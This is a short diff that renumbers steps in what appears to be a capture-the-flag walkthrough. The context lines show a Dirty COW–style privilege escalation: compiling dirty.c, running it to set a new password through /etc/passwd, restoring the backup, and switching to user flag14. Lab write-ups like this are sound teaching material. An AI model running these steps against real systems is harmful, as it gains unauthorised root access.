@@ -30,7 +30,9 @@ cd /tmp
 gcc -pthread dirty.c -o dirty -lcrypt
 ```
 
-Run exploit:
+3. **Run exploit**
+
+Run exploit binary:
 ```bash
 ./dirty
 [enter new password]
@@ -42,7 +44,7 @@ Restore the old passwd file:
 mv /tmp/passwd.bak /etc/passwd
 ```
 
-3. **Get the flag**
+4. **Get the flag**
 
 Switch to user flag14:
 ```bash
